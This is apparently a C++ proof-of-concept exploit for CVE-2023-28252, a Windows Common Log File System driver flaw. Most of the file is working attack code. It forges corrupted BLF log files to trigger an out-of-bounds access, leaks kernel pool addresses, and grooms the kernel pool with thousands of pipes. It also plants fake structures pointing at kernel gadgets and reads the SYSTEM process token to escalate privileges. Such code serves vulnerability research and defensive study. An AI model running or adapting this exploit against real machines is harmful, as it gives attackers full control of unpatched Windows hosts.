/*
 * @Date: 2026-11-09 08:47:06
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-11 20:07:42
 * @FilePath: \CVE_2023_28252\exp\CVE_2023_28252\poc.cpp
 */
#include "poc.hpp"
#include "def.hpp"
#include "clfs_types.h"
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"

#include <windows.h>
#include <clfsw32.h>
#include <iostream>
#include <string>
#include <fstream>
#include <unordered_set>
#include <vector>
#pragma comment(lib, "clfsw32.lib")
namespace CVE_2023_28252
{
    void blfParser(std::wstring filepath) {
        std::fstream fs(filepath.c_str(), std::ios::in | std::ios::out | std::ios::binary);
        if (!fs) {
            DWORD error = GetLastError();
            std::cout << "[x] open log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }
        // tellg() 返回的是当前读位置(刚打开时为 0)，必须先 seek 到文件尾才能得到文件大小
        fs.seekg(0, std::ios::end);
        std::streamsize size = fs.tellg();
        fs.seekg(0, std::ios::beg);
        if (size <= 0) {
            std::cerr << "[x] Invalid file size\n";
            return;
        }
        std::vector<char> buffer(size);

        // 一次性读取所有数据到 buffer 中
        if (!fs.read(buffer.data(), size)) {
            std::cerr << "[x] Failed to read file\n";
            return;
        }

        // 下方要按固定偏移解析 2 个控制块 + 2 个基础块，先校验文件长度
        const std::streamsize requiredSize =
            (std::streamsize)NormalBlockSize * 3 + BaseBlockSize;
        if (size < requiredSize) {
            std::cerr << "[x] File too small: 0x" << std::hex << size
                << ", need 0x" << requiredSize << std::dec << "\n";
            return;
        }

        PCLFS_LOG_BLOCK_HEADER controlBlock = (PCLFS_LOG_BLOCK_HEADER)&buffer.data()[0];
        PCLFS_LOG_BLOCK_HEADER controlBlockShadow = (PCLFS_LOG_BLOCK_HEADER)&buffer.data()[0 + NormalBlockSize];
        PCLFS_LOG_BLOCK_HEADER baseBlock = (PCLFS_LOG_BLOCK_HEADER)&buffer.data()[0 + NormalBlockSize + NormalBlockSize];
        PCLFS_LOG_BLOCK_HEADER baseBlockShadow = (PCLFS_LOG_BLOCK_HEADER)&buffer.data()[0 + NormalBlockSize + NormalBlockSize + BaseBlockSize];

        std::cout << "Control Block:\n" << std::hex;
        std::cout << " +MajorVersion: " << (DWORD)controlBlockShadow->MajorVersion << "\n";
        std::cout << " +TotalSectorCount: " << controlBlockShadow->TotalSectorCount << "\n";
        std::cout << " +RecordOffsets[0]: " << controlBlockShadow->RecordOffsets[0] << "\n";
        // RecordOffsets[0] 来自文件内容，使用前必须校验，防止越界读取导致崩溃
        const ULONG record0Offset = controlBlockShadow->RecordOffsets[0];
        if ((std::streamsize)record0Offset + sizeof(CLFS_CONTROL_RECORD) > size) {
            std::cerr << "[x] Bad RecordOffsets[0]: 0x" << std::hex << record0Offset
                << " (file size 0x" << size << ")\n";
            return;
        }
        PCLFS_CONTROL_RECORD controlRecord = (PCLFS_CONTROL_RECORD)&buffer.data()[0 + NormalBlockSize + record0Offset];
        std::cout << "    +iExtendBlock: " << controlRecord->iExtendBlock << "\n";
        std::cout << "    +iFlushBlock: " << controlRecord->iFlushBlock << std::dec << "\n";


    }
    void craftTriggerFile(std::wstring filepath) {
        const char RecordOffset12[] = { 0x69, 0x03 }; // offset 0x858 RecordOffset[12d] to 0x369
        const char data1[] = { 0xa0, 0x15 }; // offset 0x1dd0 to 0x15a0
        const char data2[] = { 0x70, 0x15 }; // offset 0x1dd4 to 0x1570
        const char data3[] = { 0x08, 0xf0, 0xfd, 0xc1 }; // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
        const char data4[] = { 0x30, 0x00 }; // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)
        const char data5[] = { 0x00, 0x00, 0x00, 0x05 }; // [HERE] offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer
        const char data6[] = { 0x58, 0x18 }; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine
        const char data7[] = { 0x88, 0x18 }; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine

        std::fstream fs(filepath.c_str(), std::ios::in | std::ios::out | std::ios::binary);
        if (!fs) {
            DWORD error = GetLastError();
            std::cout << "[x] Change log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }

        std::cout << "[+] Forge vuln trigger blf file\n";
        //CLFS_LOG_BLOCK_HEADER* pBlockHeader = (CLFS_LOG_BLOCK_HEADER*)(fileBuffer + 0x800);
        fs.seekp(0x858);
        fs.write(RecordOffset12, sizeof(RecordOffset12));
        //pBlockHeader->RecordOffsets[12] = 0x369;
        //CLFS_BASE_RECORD_HEADER* pBaseRecord = (CLFS_BASE_RECORD_HEADER*)(fileBuffer + 0x870);

        fs.seekp(0x1dd0);
        fs.write(data1, sizeof(data1));// offset 0x1dd0
        // CLFSHASHSYM* pFakeSym1 = (CLFSHASHSYM*)((unsigned char*)pBaseRecord + 0x1560);
        // pFakeSym1->cbSymName = 0x15A0; // 对应 offset 0x1dd0

        fs.seekp(0x1dd4);
        fs.write(data2, sizeof(data2));// offset 0x1dd4
        // pFakeSym1->cbOffset  = 0x1570; // 对应 offset 0x1dd4

        //CLFS_CONTAINER_CONTEXT* pFakeCtx1 = (CLFS_CONTAINER_CONTEXT*)(fileBuffer + 0x1DE0);
        fs.seekp(0x1de0);
        fs.write(data3, sizeof(data3)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x20b8);
        fs.write(data7, sizeof(data7)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x20bc);
        fs.write(data6, sizeof(data6)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x20c8);
        fs.write(data3, sizeof(data3)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x20cc);
        fs.write(data4, sizeof(data4)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x20e0);
        fs.write(data5, sizeof(data5)); // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x1de4);
        fs.write(data4, sizeof(data4)); // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

        fs.seekp(0x1df8);
        fs.write(data5, sizeof(data5)); // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer

        fs.seekp(0x8258);
        fs.write(RecordOffset12, sizeof(RecordOffset12)); // offset 0x8258 RecordOffset[12d] to 0x369// offset 0x858 RecordOffset[12d] to 0x369

        fs.seekp(0x97d0);
        fs.write(data1, sizeof(data1));// offset 0x97d0 to 0x15a0

        fs.seekp(0x97d4);
        fs.write(data2, sizeof(data2));// offset 0x97d4 to 0x1570

        fs.seekp(0x97e0);
        fs.write(data3, sizeof(data3)); // offset 0x97e0 shadow block write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x97e4);
        fs.write(data4, sizeof(data4)); // offset 0x97e4  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

        fs.seekp(0x97f8);
        fs.write(data5, sizeof(data5)); // offset 0x1df8  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer
        fs.flush();
    }

    void craftSprayFile(std::wstring filepath) {

        const char ValidSectorCount[] = { 0x01, 0x00 }; // offset 0x6 ValidSectorCount
        const char ullDumpCount[] = { 0x02, 0x00 }; // offset 0x70 ullDumpCount
        const char eExtendState[] = { 0x02, 0x00 }; // offset 0x84 eExtendState
        const char iExtendBlock[] = { 0x04, 0x00 }; // offset 0x88 iExtendBlock
        const char iFlushBlock[] = { 0x04, 0x00 }; // offset 0x8a iFlushBlock
        const char cExtendStartSectors[] = { 0x01, 0x00 }; // offset 0x90 cExtendStartSectors
        const char cExtendSectors[] = { 0x03, 0x00 }; // offset 0x94 cExtendSectors
        const char cClients[] = { 0x02, 0x00 }; // offset 0x9c cClients
        const char cbsymbolZone[] = { 0xc8, 0x65 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10
        const char rawData[512] = {
            0x15, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x1C, 0x5F, 0x00, 0x00, 0xF5, 0xC1, 0xF5, 0xC1, 0x01, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
            0x00, 0x08, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
            0x00, 0x82, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0xFC, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0xFE, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x01
        };

        std::fstream fs(filepath.c_str(), std::ios::in | std::ios::out | std::ios::binary);
        if (!fs) {
            DWORD error = GetLastError();
            std::cout << "[x] Change log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }

        std::wcout << L"[+] Forge vuln spray blf file:" << filepath << "\n";

        fs.seekp(0x400);
        fs.write(rawData, sizeof(rawData)); //build a valid header in shadow

        const char rawdata2[] = { 0x30, 0x01 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10

        fs.seekp(0x7fe);
        fs.write(rawdata2, sizeof(rawdata2)); //build a valid header in shadow

        fs.seekp(0x6);
        fs.write(ValidSectorCount, sizeof(ValidSectorCount)); //ValidSectorCount to 1


        fs.seekp(0x70);
        fs.write(ullDumpCount, sizeof(ullDumpCount)); //ullDumpCount to 2

        fs.seekp(0x84);
        fs.write(eExtendState, sizeof(eExtendState)); //changing the eExtendState to 2 (ClfsExtendStateFlushingBlock) 

        fs.seekp(0x88);
        fs.write(iFlushBlock, sizeof(iFlushBlock)); //changing the iExtendBlock to 4 

        fs.seekp(0x8A);
        fs.write(iFlushBlock, sizeof(iFlushBlock)); //changing the iFlushBlock to 4 

        fs.seekp(0x90);
        fs.write(cExtendStartSectors, sizeof(cExtendStartSectors)); //changing the cExtendStartSectors to 1 

        fs.seekp(0x94);
        fs.write(cExtendSectors, sizeof(cExtendSectors)); //changing the cExtendSectors to 3

        fs.seekp(0x9c);
        fs.write(cClients, sizeof(cClients)); //changing the cClients to 2

        fs.seekp(0x484);
        fs.write(eExtendState, sizeof(eExtendState)); //changing the eExtendState of the shadow block to 2 (ClfsExtendStateFlushingBlock) 

        const char iExtendBlock2[] = { 0x0, 0x00 }; // offset 0x488 iExtendBlock2
        const char iFlushBlock2[] = { 0x13, 0x00 }; // offset 0x48a iFlushBlock2, causing oob-----------[VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN]

        fs.seekp(0x488);
        fs.write(iExtendBlock2, sizeof(iExtendBlock2)); //changing the iExtendBlock of the shadow block to 13 

        fs.seekp(0x48A);
        fs.write(iFlushBlock2, sizeof(iFlushBlock2)); //changing the iFlushBlock of the shadow block to 13 

        fs.seekp(0x1b98);
        fs.write(cbsymbolZone, sizeof(cbsymbolZone)); // changing the cbsymbolZone to 0x65c8

        fs.seekp(0x9598);
        fs.write(cbsymbolZone, sizeof(cbsymbolZone)); //changing the cbsymbolZone to of the shadow 0x65c8
        fs.flush();

        return;
    }

    void PoC() {

        getVirtualFunction();
        getVirtualAddress();

        tFileName = RandomUIntWString(100, 1000);//no `+ L".blf"`
        tFilePath = L"C:\\Users\\Public\\" + tFileName;
        tLogFilePath = L"LOG:" + tFilePath;
        tContainerPath = L"C:\\Users\\Public\\.p_" + tFileName;
        tFilePath += L".blf";

        // 1. 创建模板 BLF 文件
        HANDLE hTFile = CreateLogFile(tLogFilePath.c_str(), GENERIC_READ |
            GENERIC_WRITE, 1, 0, 4, 0);
        if (hTFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            std::cout << "[x] Create log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }
        std::wcout << "[+] Filename: " << tFileName << "\n"
            << "[+] FilePath: " << tFilePath << "\n"
            << "[+] LOG FilePath: " << tLogFilePath << "\n";
        CloseHandle(hTFile);

        // 2.修改BLF文件
        craftTriggerFile(tFilePath);

        // 3. 修复crc32校验并泄露新的 BaseBlock 的堆地址
        std::cout << "[+] Fix new content log file crc32 value\n";
        fixCRCFile(tFilePath);

        UINT64 foundAddrs[100] = {};
        ULONG_PTR CLFS_kernelAddrArray;
        auto count = exploit::memtools::ulFindKernelPoolAddress(ClfsTagName, BaseBlockSize, foundAddrs, 100);
        if (count <= 0) {
            std::cout << "[x] Sth wrong with CLFS.sys\n";
            exit(0);
        }
        std::unordered_set<UINT64> oldSet(foundAddrs, foundAddrs + count);
        printf("[+] 1. Get CLFS kernel addr: %ld\n", count);

        hTFile = CreateLogFile(tLogFilePath.c_str(), 0xC0010000, FILE_SHARE_READ, 0, 3, 0);
        if (hTFile == INVALID_HANDLE_VALUE) {
            printf("[+] Can't open hlog file\n");
            exit(0);
        }
        count = exploit::memtools::ulFindKernelPoolAddress(ClfsTagName, BaseBlockSize, foundAddrs, 100);
        if (count <= 0) {
            std::cout << "[x] Sth wrong with CLFS.sys\n";
            exit(0);
        }
        std::unordered_set<UINT64> newSet(foundAddrs, foundAddrs + count);
        printf("[+] 2. Get CLFS kernel addr: %ld\n", count);
        int newChunkCount = 0;

        for (UINT64 addr : newSet) {
            if (oldSet.find(addr) == oldSet.end()) {
                CLFS_kernelAddrArray = addr;
                newChunkCount++;
            }
        }
        if (newChunkCount == 1) {
            printf("[+] Found new trigger blf chunk: 0x%p, with tag: %X, size: 0x%X\n", (void*)CLFS_kernelAddrArray, ClfsTagName, BaseBlockSize);
        }
        else if (newChunkCount == 0) {
            printf("[!] Failed to find the new chunk.\n");
            exit(0);
        }
        else {
            printf("[!] Warning: found multiple (%d) new chunks, race condition?\n", newChunkCount);
            exit(0);
        }
        getchar();

        //4.实例化数据，确保数据驻留在内存中，后续伪造会继续使用这个container中的相关数据
        //  在内核激活该容器
        LONGLONG pcbContainer = 512;
        if (!AddLogContainer(hTFile, (PULONGLONG)&pcbContainer, (LPWSTR)tContainerPath.c_str(), 0))
        {
            CloseHandle(hTFile);
            // printf("AddLogContainer Fail, please delete C:\\Users\\Public\\MyLxg_xxx.blf and try again\n");
            std::wcout << L"[x] AddLogContainer Fail, please delete " << tFilePath << " and try again\n";
            exit(1);
        }

        //5.构造用于攻击的blf文件
        std::vector<HANDLE> oobFile;
        std::vector<std::wstring> oobFileName;
        std::vector<std::wstring> oobFilePath;
        std::vector<std::wstring> oobLogPath;
        std::vector<std::wstring> oobContainerPath;
        for (size_t i = 0; i < 10; i++)
        {
            auto temp_fileName = tFileName + L"_" + RandomUIntWString(100, 1000);
            auto temp_filePath = L"C:\\Users\\Public\\" + temp_fileName;
            auto temp_logFilePath = L"LOG:" + temp_filePath;
            auto temp_containerPath = L"C:\\Users\\Public\\.p_" + temp_fileName;
            temp_filePath += L".blf";
            oobFileName.push_back(temp_fileName);
            oobFilePath.push_back(temp_filePath);
            oobLogPath.push_back(temp_logFilePath);
            oobContainerPath.push_back(temp_containerPath);
        }

        auto sprayFile_0 = CreateLogFile(oobLogPath[0].c_str(), GENERIC_READ | GENERIC_WRITE, 1, 0, OPEN_ALWAYS, 0);
        if (sprayFile_0 == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            printf("Could not create LOGfile2, error: 0x%x\n", (unsigned int)error);
            exit(-1);
        }
        CloseHandle(sprayFile_0);
        for (int i = 1; i < oobFilePath.size(); i++)
        {
            int resul = CopyFileW(oobFilePath[0].c_str(), oobFilePath[i].c_str(), TRUE);

            if (resul == 0) {
                DWORD error = GetLastError();
                printf("copy error: 0x%x\n", (unsigned int)error);
                exit(-1);
            }

            // fun_trigger(stored_log_arrays[i], stored_fopen_arrays[i]);
            craftSprayFile(oobFilePath[i]);
            fixCRCFile(oobFilePath[i]);
        }

        //6.准备堆喷射
        HANDLE _hthread = GetCurrentThread();//将当前线程锁定在CPU_0，增大喷射后的填充概率
        SetThreadAffinityMask(_hthread, 1);

        UINT64 arrayCLFSkernelAddress[12] = { 0 };
        arrayCLFSkernelAddress[0] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[1] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[2] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[3] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[4] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[5] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[6] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[7] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[8] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[9] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[10] = CLFS_kernelAddrArray + 0x30;
        arrayCLFSkernelAddress[11] = CLFS_kernelAddrArray + 0x30;

        std::vector<pairPipe> pipesA, pipesB;
        for (size_t i = 0; i < 0x5000; i++)
        {
            pairPipe temp = {};
            if (!CreatePipe(&temp.r, &temp.w, 0, 0x25C0)) {
                std::cout << "[!] created pipe: " << i << " failed\n";
                continue;
            }
            pipesA.push_back(temp);
        }

        for (size_t i = 0; i < 0x4000; i++)
        {
            pairPipe temp = {};
            if (!CreatePipe(&temp.r, &temp.w, 0, 0x25C0)) {
                std::cout << "[!] created pipe: " << i << " failed\n";
                continue;
            }
            pipesB.push_back(temp);
        }

        DWORD byteswritten;
        for (size_t i = 0; i < 0x5000; i++)
        {
            if (!WriteFile(pipesA[i].w, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))
            {
                std::cout << "[!] Grooming pool failed\n";
                exit(1);
            }
        }

        for (size_t i = 1; i < 0x666; i++)
        {
            if (i % 10 == 0) {
                CloseHandle(pipesA[i].r);
                CloseHandle(pipesA[i].w);
                pipesA[i] = {};
            }
        }

        // 7.使用blf填充空洞
        for (size_t i = 0; i < 10; i++)
        {
            auto tempHandle = CreateLogFile(oobLogPath[i].c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, 0);
            if (tempHandle == INVALID_HANDLE_VALUE) {
                DWORD error = GetLastError();
                printf("Could not create LOGfile3, error: 0x%x\n", (unsigned int)error);
                exit(-1);
            }
            oobFile.push_back(tempHandle);
        }

        for (size_t i = 0; i < 0x4000; i++)
        {
            if (!WriteFile(pipesB[i].w, arrayCLFSkernelAddress, 0x60, &byteswritten, 0))
            {
                std::cout << "[!] Grooming pool failed\n";
                exit(1);
            }
        }


        // 8.填充伪造结构体
        LONGLONG pcbContainer2 = 512;
        if (!VirtualAlloc((LPVOID)0x5000000, 0x100000, 0x3000, 4)) {
            printf("[x] Failed to allocate memory 0x5000000\n");
            return;
        }
        if (!VirtualAlloc((LPVOID)0xffffffff, 0x10000, 0x3000, 4))
        {
            printf("[x] Failed to allocate memory 0xffffffff\n");
            return;
        }




        int const_0x5a = 0x5a;
        IO_STATUS_BLOCK status_block = { 0 };
        auto temp_chunk = new char[0x2000];
        ULONG_PTR system_EPROCESS;
        exploit::memtools::bFindHandleObject(4, 4, (ULONG_PTR)&system_EPROCESS);
        printf("[+]System EPROCESS addr: %p\n", system_EPROCESS);
        auto  system_EPROCESS_high = system_EPROCESS & 0xfffffffffffff000;
        auto offset = (unsigned int)(system_EPROCESS & 0xfff) + exploit::gadget::X_22621_1105::tokenToEporcessOffset;
        std::cout << "[+] offset = 0x" << std::hex << offset << std::dec << "\n";

        UINT64 dest3 = 0x100000007;
        UINT64 dest2 = 0xffffffff;
        memset((LPVOID)dest3, 0, 0xff8);
        *(UINT64*)dest2 = system_EPROCESS_high;
        *(UINT64*)dest3 = 0x414141414141005A;


        getchar();
        for (size_t i = 0; i < 10; i++)
        {
            std::cout << "[*] " << i << " Time to try================================\n";
            std::cout << "[+] Start trigger vuln\n";
            // getchar();
            AddLogContainer(oobFile[i], (PULONGLONG)&pcbContainer2, (LPWSTR)oobContainerPath[i].c_str(), 0);// AddLogContainer
            std::cout << "[+] Out of Boundary just happend\n";
            *(UINT64*)0x5000040 = 0x5000000;
            *(UINT64*)0x5000000 = 0x5001000;
            *(UINT64*)0x5001000 = fnClfsEarlierLsn;
            *(UINT64*)0x5001008 = fnPoFxProcessorNotification;
            *(UINT64*)0x5001010 = fnClfsEarlierLsn;
            *(UINT64*)0x5001018 = fnClfsEarlierLsn;
            *(UINT64*)0x5001020 = fnClfsEarlierLsn;
            *(UINT64*)0x5001028 = fnClfsEarlierLsn;
            *(UINT64*)0x5001030 = fnClfsEarlierLsn;
            *(UINT64*)0x5001038 = fnClfsEarlierLsn;
            *(UINT64*)0x5001040 = fnClfsEarlierLsn;
            *(UINT64*)0x5000068 = fnClfsMgmtDeregisterManagedClient;
            *(UINT64*)0x5000048 = 0x5000400;
            *(UINT64*)0x5000400 = 0x5001300;
            *(UINT64*)0x5000448 = para_PipeAttributeobjInkernel + 0x18;
            *(UINT64*)0x5001328 = fnClfsEarlierLsn;
            *(UINT64*)0x5001308 = fnSeSetAccessStateGenericMapping;
            // getchar();
            std::cout << "[+] Next is using vuln\n";
            auto handle = CreateLogFile(tLogFilePath.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, 0, OPEN_EXISTING, 0);
            CloseHandle(handle);

            NtFsControlFile(g_VictimPipes.w, 0, 0, 0, &status_block, 0x110038, &const_0x5a, 2, temp_chunk, 0x2000);
            // auto systemTokenValue = *(UINT64*)((UINT64)offset + (UINT64)temp_chunk);
            ULONG_PTR systemTokenValue = *(ULONG_PTR*)(temp_chunk + offset);
            printf("[+] System Token Value: 0x%p\n", systemTokenValue);
            exploit::memtools::hexdump(temp_chunk + offset - 0x10, 0x50);

        }

        delete[] temp_chunk;
    }

} // namespace CVE_2023_28252